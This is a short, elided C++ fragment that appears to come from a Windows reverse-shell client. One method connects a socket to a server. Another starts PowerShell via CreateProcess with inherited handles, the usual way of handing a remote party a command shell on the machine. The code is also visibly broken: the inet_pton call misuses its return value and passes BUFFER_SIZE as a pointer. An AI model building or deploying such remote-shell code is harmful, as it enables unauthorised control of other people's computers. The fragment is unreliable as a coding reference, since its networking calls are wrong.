...
void Client::connect_socket() {
    ...
    addr.sin_addr.s_addr = inet_pton(addr.sin_family, (PCSTR)server, (void*)BUFFER_SIZE);
...
int Client::start_shell() {
    ...
    // starting powershell
    CreateProcess(NULL, (LPWSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOW)&sinfo, &pinfo);
